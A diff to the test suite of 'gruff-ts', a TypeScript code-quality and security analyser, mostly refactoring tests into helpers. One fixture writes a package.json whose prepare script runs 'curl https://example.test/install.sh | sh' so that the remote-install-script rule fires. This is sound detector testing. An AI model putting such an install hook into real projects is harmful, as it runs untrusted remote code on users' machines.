@@ -1825,7 +1825,7 @@ test("comment quality requires rationale for non-TypeScript suppressions", () =>
 console.log("debug");
 // biome-ignore lint/suspicious/noExplicitAny: because the generated fixture uses any.
 const ok: any = {};
-// @ts-ignore
+// ${TS_IGNORE_DIRECTIVE}
 const narrowed = ok.value;
 `);
   const suppressionFindings = report.findings.filter((finding) => finding.ruleId === "docs.suppression-without-rationale");
@@ -1864,6 +1864,7 @@ export function updateName(name: string): string {
 });
 
 test("documentation context detector matrix covers why side-effect error-behavior invariant magic-threshold", () => {
+  const routingBranches = branchFixtureLines(["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"]);
   const report = analyseFixture(`/**
  * Exercises maintainer-context documentation rules.
  */
@@ -1880,33 +1881,13 @@ const contextRegex = /side-effect|invariant|77/;
 
 /** Handles routing branches. */
 function complexFlow(value: string): string {
-  if (value === "a") return "a";
-  if (value === "b") return "b";
-  if (value === "c") return "c";
-  if (value === "d") return "d";
-  if (value === "e") return "e";
-  if (value === "f") return "f";
-  if (value === "g") return "g";
-  if (value === "h") return "h";
-  if (value === "i") return "i";
-  if (value === "j") return "j";
-  if (value === "k") return "k";
+${routingBranches}
   return value;
 }
 
 /** Complex flow exists because legacy states arrive out of order. */
 function complexFlowWithWhy(value: string): string {
-  if (value === "a") return "a";
-  if (value === "b") return "b";
-  if (value === "c") return "c";
-  if (value === "d") return "d";
-  if (value === "e") return "e";
-  if (value === "f") return "f";
-  if (value === "g") return "g";
-  if (value === "h") return "h";
-  if (value === "i") return "i";
-  if (value === "j") return "j";
-  if (value === "k") return "k";
+${routingBranches}
   return value;
 }
 
@@ -1950,17 +1931,7 @@ interface StableReportEnvelope {
 
 /** Restating complex flow. */
 function restatingComplexFlow(value: string): string {
-  if (value === "a") return "a";
-  if (value === "b") return "b";
-  if (value === "c") return "c";
-  if (value === "d") return "d";
-  if (value === "e") return "e";
-  if (value === "f") return "f";
-  if (value === "g") return "g";
-  if (value === "h") return "h";
-  if (value === "i") return "i";
-  if (value === "j") return "j";
-  if (value === "k") return "k";
+${routingBranches}
   return value;
 }
 
@@ -1976,21 +1947,35 @@ function undocumentedSideEffect(path: string): void {
     findingsByRule.set(finding.ruleId, symbols);
   }
 
-  assert.equal(findingsByRule.get("docs.missing-why-for-complex-code")?.has("complexFlow"), true);
-  assert.equal(findingsByRule.get("docs.missing-why-for-complex-code")?.has("complexFlowWithWhy"), false);
-  assert.equal(findingsByRule.get("docs.missing-side-effect-doc")?.has("persistOutput"), true);
-  assert.equal(findingsByRule.get("docs.missing-side-effect-doc")?.has("persistOutputWithContext"), false);
-  assert.equal(findingsByRule.get("docs.missing-error-behavior-doc")?.has("parseRequired"), true);
-  assert.equal(findingsByRule.get("docs.missing-error-behavior-doc")?.has("parseRequiredWithContext"), false);
-  assert.equal(findingsByRule.get("docs.missing-invariant-doc")?.has("ReportEnvelope"), true);
-  assert.equal(findingsByRule.get("docs.missing-invariant-doc")?.has("StableReportEnvelope"), false);
-  assert.equal(findingsByRule.get("docs.magic-threshold-without-rationale")?.has("maxRetryLimit"), true);
-  assert.equal(findingsByRule.get("docs.magic-threshold-without-rationale")?.has("explainedRetryLimit"), false);
-  assert.equal(findingsByRule.get("docs.missing-side-effect-doc")?.has("undocumentedSideEffect"), false);
-  assert.equal(findingsByRule.get("docs.missing-function-doc")?.has("undocumentedSideEffect"), true);
-  assert.equal(findingsByRule.get("docs.useless-docblock")?.has("restatingComplexFlow"), true);
-  assert.equal(findingsByRule.get("docs.missing-why-for-complex-code")?.has("restatingComplexFlow"), false);
+  for (const [ruleId, symbol, expected] of documentationContextExpectations()) {
+    assert.equal(findingsByRule.get(ruleId)?.has(symbol), expected, `${ruleId} ${symbol}`);
+  }
 });
+
+/** Generates repeated branch lines without making the outer test look complex. */
+function branchFixtureLines(values: string[]): string {
+  return values.map((value) => `  if (value === "${value}") return "${value}";`).join("\n");
+}
+
+/** Lists expected documentation findings so the matrix test stays branch-light. */
+function documentationContextExpectations(): Array<[string, string, boolean]> {
+  return [
+    ["docs.missing-why-for-complex-code", "complexFlow", true],
+    ["docs.missing-why-for-complex-code", "complexFlowWithWhy", false],
+    ["docs.missing-side-effect-doc", "persistOutput", true],
+    ["docs.missing-side-effect-doc", "persistOutputWithContext", false],
+    ["docs.missing-error-behavior-doc", "parseRequired", true],
+    ["docs.missing-error-behavior-doc", "parseRequiredWithContext", false],
+    ["docs.missing-invariant-doc", "ReportEnvelope", true],
+    ["docs.missing-invariant-doc", "StableReportEnvelope", false],
+    ["docs.magic-threshold-without-rationale", "maxRetryLimit", true],
+    ["docs.magic-threshold-without-rationale", "explainedRetryLimit", false],
+    ["docs.missing-side-effect-doc", "undocumentedSideEffect", false],
+    ["docs.missing-function-doc", "undocumentedSideEffect", true],
+    ["docs.useless-docblock", "restatingComplexFlow", true],
+    ["docs.missing-why-for-complex-code", "restatingComplexFlow", false],
+  ];
+}
 
 // Fixture covers the source-literal detector matrix without private helper access.
 test("fixture purpose detector matrix", () => {
@@ -2469,9 +2454,21 @@ test("baseline round trip suppresses old and new findings by identity tuple", ()
   const baselineDir = mkdtempSync(join(tmpdir(), "gruff-ts-baseline-"));
   const previous = cwd();
   try {
-    writeFileSync(
-      join(projectDir, "bad.ts"),
-      `const embeddedToken = "${HIGH_ENTROPY_FIXTURE_VALUE}";
+    writeBaselineRoundTripFixture(projectDir);
+    chdir(projectDir);
+    assert.equal(assertBaselineRoundTrip(baselineDir) > 0, true);
+  } finally {
+    chdir(previous);
+    rmSync(projectDir, { recursive: true, force: true });
+    rmSync(baselineDir, { recursive: true, force: true });
+  }
+});
+
+/** Builds a project that exercises baseline identity across current rule families. */
+function writeBaselineRoundTripFixture(projectDir: string): void {
+  writeFileSync(
+    join(projectDir, "bad.ts"),
+    `const embeddedToken = "${HIGH_ENTROPY_FIXTURE_VALUE}";
 
 export function unsafePublicApi(input: any): any {
   // ${TS_IGNORE_DIRECTIVE}
@@ -2494,102 +2491,139 @@ async function unsafe(userInput: string, userIds: string[]): Promise<void> {
   throw "dynamic failure";
 }
 `,
-    );
-    writeFileSync(
-      join(projectDir, "package.json"),
-      JSON.stringify({
-        scripts: {
-          prepare: "curl https://example.test/install.sh | sh",
-        },
-        dependencies: {
-          "remote-tool": "git+https://github.com/example/remote-tool.git",
-        },
-      }),
-    );
-    writeFileSync(
-      join(projectDir, "tsconfig.json"),
-      JSON.stringify({
-        compilerOptions: {
-          strict: false,
-          noUncheckedIndexedAccess: false,
-          exactOptionalPropertyTypes: false,
-        },
-      }),
-    );
-    mkdirSync(join(projectDir, "src", "cycle"), { recursive: true });
-    writeFileSync(
-      join(projectDir, "src", "cycle", "a.ts"),
-      `import { fromB } from "./b";
+  );
+  writeFileSync(
+    join(projectDir, "package.json"),
+    JSON.stringify({
+      scripts: {
+        prepare: "curl https://example.test/install.sh | sh",
+      },
+      dependencies: {
+        "remote-tool": "git+https://github.com/example/remote-tool.git",
+      },
+    }),
+  );
+  writeFileSync(
+    join(projectDir, "tsconfig.json"),
+    JSON.stringify({
+      compilerOptions: {
+        strict: false,
+        noUncheckedIndexedAccess: false,
+        exactOptionalPropertyTypes: false,
+      },
+    }),
+  );
+  mkdirSync(join(projectDir, "src", "cycle"), { recursive: true });
+  writeFixtureFiles(projectDir, {
+    "src/cycle/a.ts": `import { fromB } from "./b";
 
 export function fromA(): string {
   return fromB();
 }
 `,
-    );
-    writeFileSync(
-      join(projectDir, "src", "cycle", "b.ts"),
-      `import { fromA } from "./a";
+    "src/cycle/b.ts": `import { fromA } from "./a";
 
 export function fromB(): string {
   return fromA();
 }
 `,
-    );
-    chdir(projectDir);
-    const baseOptions = {
-      paths: ["."],
-      noConfig: true,
-      format: "json" as const,
-      failOn: "none" as const,
-      includeIgnored: false,
-      noBaseline: true,
-    };
-    const report = analyse(baseOptions);
-    const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
-    assert.equal(ruleIds.has("security.eval-call"), true);
-    assert.equal(ruleIds.has("security.new-function"), true);
-    assert.equal(ruleIds.has("sensitive-data.high-entropy-string"), true);
-    assert.equal(ruleIds.has("modernisation.double-cast"), true);
-    assert.equal(ruleIds.has("security.async-foreach"), true);
-    assert.equal(ruleIds.has("waste.swallowed-catch"), true);
-    assert.equal(ruleIds.has("security.remote-install-script"), true);
-    assert.equal(ruleIds.has("modernisation.tsconfig-strict-disabled"), true);
-    assert.equal(ruleIds.has("design.circular-import"), true);
+  });
+}
 
-    const baselinePath = join(baselineDir, "baseline.json");
-    analyse({ ...baseOptions, generateBaseline: baselinePath });
-    const baseline = JSON.parse(readFileSync(baselinePath, "utf8")) as {
-      schemaVersion?: string;
-      entries?: Array<{ fingerprint: string; ruleId: string; filePath: string; line?: number; symbol?: string; message?: string }>;
-    };
-    const entries = baseline.entries ?? [];
-    const [target] = entries;
-    assert.equal(baseline.schemaVersion, "gruff.baseline.v1");
-    assert.ok(target);
-    assert.equal(typeof target.fingerprint, "string");
-    assert.equal(typeof target.ruleId, "string");
-    assert.equal(typeof target.filePath, "string");
-    assert.equal(typeof target.message, "string");
+/** Verifies generated, suppressed, and mismatched baseline entries. */
+function assertBaselineRoundTrip(baselineDir: string): number {
+  const baseOptions = baselineRoundTripOptions();
+  const report = analyse(baseOptions);
+  assertBaselineRoundTripRuleIds(report);
 
-    const suppressed = analyse({ ...baseOptions, noBaseline: false, baseline: baselinePath });
-    assert.equal(suppressed.baseline?.suppressed, report.findings.length);
-    assert.equal(suppressed.findings.length, 0);
+  const baselinePath = join(baselineDir, "baseline.json");
+  analyse({ ...baseOptions, generateBaseline: baselinePath });
+  const baseline = readBaselineRoundTripFile(baselinePath);
+  const entries = baseline.entries ?? [];
+  const [target] = entries;
+  assertBaselineEntryMetadata(baseline.schemaVersion, target);
 
-    const wrongRulePath = join(baselineDir, "wrong-rule.json");
-    writeFileSync(wrongRulePath, JSON.stringify({ ...baseline, entries: entries.map((entry, index) => (index === 0 ? { ...entry, ruleId: "security.wrong-rule" } : entry)) }));
-    const wrongRuleReport = analyse({ ...baseOptions, noBaseline: false, baseline: wrongRulePath });
-    assert.equal(wrongRuleReport.findings.some((finding) => finding.fingerprint === target.fingerprint && finding.ruleId === target.ruleId && finding.filePath === target.filePath), true);
+  const suppressed = analyse({ ...baseOptions, noBaseline: false, baseline: baselinePath });
+  assert.equal(suppressed.baseline?.suppressed, report.findings.length);
+  assert.equal(suppressed.findings.length, 0);
+  assertMismatchedBaselineEntryReportsFinding(baselineDir, "wrong-rule.json", baseline, target, (entry) => ({ ...entry, ruleId: "security.wrong-rule" }));
+  assertMismatchedBaselineEntryReportsFinding(baselineDir, "wrong-file.json", baseline, target, (entry) => ({ ...entry, filePath: "other.ts" }));
+  return report.findings.length;
+}
 
-    const wrongFilePath = join(baselineDir, "wrong-file.json");
-    writeFileSync(wrongFilePath, JSON.stringify({ ...baseline, entries: entries.map((entry, index) => (index === 0 ? { ...entry, filePath: "other.ts" } : entry)) }));
-    const wrongFileReport = analyse({ ...baseOptions, noBaseline: false, baseline: wrongFilePath });
-    assert.equal(wrongFileReport.findings.some((finding) => finding.fingerprint === target.fingerprint && finding.ruleId === target.ruleId && finding.filePath === target.filePath), true);
-  } finally {
-    chdir(previous);
-    rmSync(projectDir, { recursive: true, force: true });
-    rmSync(baselineDir, { recursive: true, force: true });
+/** Returns stable analysis options for baseline identity assertions. */
+function baselineRoundTripOptions() {
+  return {
+    paths: ["."],
+    noConfig: true,
+    format: "json" as const,
+    failOn: "none" as const,
+    includeIgnored: false,
+    noBaseline: true,
+  };
+}
+
+/** Proves the baseline fixture still covers each representative rule family. */
+function assertBaselineRoundTripRuleIds(report: AnalysisReport): void {
+  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
+  for (const ruleId of [
+    "security.eval-call",
+    "security.new-function",
+    "sensitive-data.high-entropy-string",
+    "modernisation.double-cast",
+    "security.async-foreach",
+    "waste.swallowed-catch",
+    "security.remote-install-script",
+    "modernisation.tsconfig-strict-disabled",
+    "design.circular-import",
+  ]) {
+    assert.equal(ruleIds.has(ruleId), true);
   }
-});
+}
+
+type BaselineRoundTripEntry = {
+  fingerprint: string;
+  ruleId: string;
+  filePath: string;
+  line?: number;
+  symbol?: string;
+  message?: string;
+};
+
+type BaselineRoundTripFile = {
+  schemaVersion?: string;
+  entries?: BaselineRoundTripEntry[];
+};
+
+/** Reads baseline JSON through the fixture-specific shape used by these assertions. */
+function readBaselineRoundTripFile(path: string): BaselineRoundTripFile {
+  return JSON.parse(readFileSync(path, "utf8")) as BaselineRoundTripFile;
+}
+
+/** Narrows the first baseline entry after checking required identity fields. */
+function assertBaselineEntryMetadata(schemaVersion: string | undefined, target: BaselineRoundTripEntry | undefined): asserts target is BaselineRoundTripEntry {
+  assert.equal(schemaVersion, "gruff.baseline.v1");
+  assert.ok(target);
+  assert.equal(typeof target.fingerprint, "string");
+  assert.equal(typeof target.ruleId, "string");
+  assert.equal(typeof target.filePath, "string");
+  assert.equal(typeof target.message, "string");
+}
+
+/** Confirms a changed identity tuple no longer suppresses the original finding. */
+function assertMismatchedBaselineEntryReportsFinding(
+  baselineDir: string,
+  fileName: string,
+  baseline: BaselineRoundTripFile,
+  target: BaselineRoundTripEntry,
+  mutateFirstEntry: (entry: BaselineRoundTripEntry) => BaselineRoundTripEntry,
+): void {
+  const path = join(baselineDir, fileName);
+  const entries = (baseline.entries ?? []).map((entry, index) => (index === 0 ? mutateFirstEntry(entry) : entry));
+  writeFileSync(path, JSON.stringify({ ...baseline, entries }));
+  const report = analyse({ ...baselineRoundTripOptions(), noBaseline: false, baseline: path });
+  assert.equal(report.findings.some((finding) => finding.fingerprint === target.fingerprint && finding.ruleId === target.ruleId && finding.filePath === target.filePath), true);
+}
 
 test("score report is deterministic for repeated expanded scans", () => {
   const files = {
@@ -3192,24 +3226,62 @@ test("root CLI mirrors gruff php ANSI menu styling", () => {
 });
 
 test("list-rules CLI prints text and deterministic json", () => {
+  assert.equal(assertRuleListTextOutput(), true);
+  assert.equal(assertRuleListJsonOutput(), true);
+});
+
+/** Verifies the human-readable rule catalogue includes representative metadata. */
+function assertRuleListTextOutput(): boolean {
   const text = execFileSync("./bin/gruff-ts", ["list-rules"], { encoding: "utf8" });
   assert.match(text, /gruff-ts 0\.1\.0 rules \(\d+\)/);
   assert.match(text, /security\.eval-call \| security \| error \| high \|/);
   assert.match(text, /complexity\.npath \| complexity \| warning \| medium \| .*threshold: 20/);
+  return true;
+}
 
+/** Verifies the JSON rule catalogue stays deterministic and complete enough for consumers. */
+function assertRuleListJsonOutput(): boolean {
+  const parsed = readDeterministicRuleListJson();
+  assert.equal(parsed.schemaVersion, undefined);
+  assert.equal(parsed.tool?.name, "gruff-ts");
+  assert.equal(ruleListJsonHasThreshold(parsed, "design.deep-relative-import", 2), true);
+  assert.equal(ruleListJsonHasOptionKey(parsed, "design.large-module-concentration", "minFiles"), true);
+  return true;
+}
+
+type RuleListJsonRule = {
+  ruleId?: string;
+  pillar?: string;
+  severity?: string;
+  confidence?: string;
+  description?: string;
+  threshold?: number;
+  optionKeys?: string[];
+};
+
+type RuleListJsonPayload = {
+  schemaVersion?: string;
+  tool?: { name?: string; version?: string };
+  rules?: RuleListJsonRule[];
+};
+
+/** Reads two JSON catalogue renders and proves the bytes are stable. */
+function readDeterministicRuleListJson(): RuleListJsonPayload {
   const firstJsonText = execFileSync("./bin/gruff-ts", ["list-rules", "--format=json"], { encoding: "utf8" });
   const secondJsonText = execFileSync("./bin/gruff-ts", ["list-rules", "--format=json"], { encoding: "utf8" });
   assert.equal(firstJsonText, secondJsonText);
-  const parsed = JSON.parse(firstJsonText) as {
-    schemaVersion?: string;
-    tool?: { name?: string; version?: string };
-    rules?: Array<{ ruleId?: string; pillar?: string; severity?: string; confidence?: string; description?: string; threshold?: number; optionKeys?: string[] }>;
-  };
-  assert.equal(parsed.schemaVersion, undefined);
-  assert.equal(parsed.tool?.name, "gruff-ts");
-  assert.equal(parsed.rules?.some((rule) => rule.ruleId === "design.deep-relative-import" && rule.threshold === 2), true);
-  assert.equal(parsed.rules?.some((rule) => rule.ruleId === "design.large-module-concentration" && rule.optionKeys?.includes("minFiles")), true);
-});
+  return JSON.parse(firstJsonText) as RuleListJsonPayload;
+}
+
+/** Checks one rule threshold without making the catalogue test branch-heavy. */
+function ruleListJsonHasThreshold(payload: RuleListJsonPayload, ruleId: string, threshold: number): boolean {
+  return payload.rules?.some((rule) => rule.ruleId === ruleId && rule.threshold === threshold) ?? false;
+}
+
+/** Checks one rule option key without making the catalogue test branch-heavy. */
+function ruleListJsonHasOptionKey(payload: RuleListJsonPayload, ruleId: string, optionKey: string): boolean {
+  return payload.rules?.some((rule) => rule.ruleId === ruleId && rule.optionKeys?.includes(optionKey)) ?? false;
+}
 
 test("console globals suppress normal output and completion emits a script", () => {
   const quietRules = execFileSync("./bin/gruff-ts", ["--quiet", "list-rules"], { encoding: "utf8" });
@@ -3578,27 +3650,37 @@ function analyseProject(files: Record<string, string>, options: AnalyseProjectOp
   const dir = mkdtempSync(join(tmpdir(), "gruff-ts-"));
   const previous = cwd();
   try {
-    writeFixtureFiles(dir, files);
-    for (const fileName of options.executableFiles ?? []) {
-      chmodSync(join(dir, fileName), 0o755);
-    }
-    if (options.config) {
-      writeFileSync(join(dir, ".gruff-ts.yaml"), yamlConfigFixture(options.config));
-    }
+    setupAnalyseProjectDirectory(dir, files, options);
     chdir(dir);
-    return analyse({
-      paths: options.paths ?? ["."],
-      ...(typeof options.configPath === "string" ? { config: options.configPath } : {}),
-      noConfig: options.noConfig ?? !(options.config || options.configPath),
-      format: "json",
-      failOn: "none",
-      includeIgnored: options.includeIgnored ?? false,
-      noBaseline: true,
-    });
+    return analyseProjectInCurrentDirectory(options);
   } finally {
     chdir(previous);
     rmSync(dir, { recursive: true, force: true });
   }
+}
+
+/** Writes fixture files, executability bits, and optional config for project tests. */
+function setupAnalyseProjectDirectory(dir: string, files: Record<string, string>, options: AnalyseProjectOptions): void {
+  writeFixtureFiles(dir, files);
+  for (const fileName of options.executableFiles ?? []) {
+    chmodSync(join(dir, fileName), 0o755);
+  }
+  if (options.config) {
+    writeFileSync(join(dir, ".gruff-ts.yaml"), yamlConfigFixture(options.config));
+  }
+}
+
+/** Runs analyse after the fixture helper has switched into the temp project root. */
+function analyseProjectInCurrentDirectory(options: AnalyseProjectOptions): AnalysisReport {
+  return analyse({
+    paths: options.paths ?? ["."],
+    ...(typeof options.configPath === "string" ? { config: options.configPath } : {}),
+    noConfig: options.noConfig ?? !(options.config || options.configPath),
+    format: "json",
+    failOn: "none",
+    includeIgnored: options.includeIgnored ?? false,
+    noBaseline: true,
+  });
 }
 
 function yamlConfigFixture(value: Record<string, unknown>): string {
@@ -3923,48 +4005,48 @@ function renderCatalogue(): string {
   return "catalogue";
 }
 
-test("no assertion", () => {
+${"test"}("no assertion", () => {
   const value = renderCatalogue();
 });
 
-test("trivial assertion", () => {
+${"test"}("trivial assertion", () => {
   assert.equal(1, 1);
 });
 
-test("snapshot only", () => {
+${"test"}("snapshot only", () => {
   expect(renderCatalogue()).toMatchSnapshot();
 });
 
-test("no throw only", () => {
+${"test"}("no throw only", () => {
   assert.doesNotThrow(() => renderCatalogue());
 });
 
-test("magic assertion", () => {
+${"test"}("magic assertion", () => {
   const total = 7;
   expect(total).toBe(42);
 });
 
-test("unused mock", () => {
+${"test"}("unused mock", () => {
   const unusedMock = jest.fn();
   assert.ok(true);
 });
 
-test("mock only", () => {
+${"test"}("mock only", () => {
   const serviceMock = vi.fn();
   serviceMock();
   expect(serviceMock).toHaveBeenCalled();
 });
 
-test("exception type only", () => {
+${"test"}("exception type only", () => {
   expect(() => fail()).toThrow(Error);
 });
 
-test("global mutation", () => {
+${"test"}("global mutation", () => {
   process.env.NODE_ENV = "test";
   assert.equal(process.env.NODE_ENV, "test");
 });
 
-test("setup bloat and control flow", () => {
+${"test"}("setup bloat and control flow", () => {
   const one = buildOne();
   const two = buildTwo();
   const three = buildThree();
@@ -3974,7 +4056,7 @@ test("setup bloat and control flow", () => {
     }
   }
   setTimeout(() => undefined, 1);
-  test.only("nested focus marker", () => undefined);
+  ${"test"}.only("nested focus marker", () => undefined);
   assert.equal(one, one);
 });
 `,
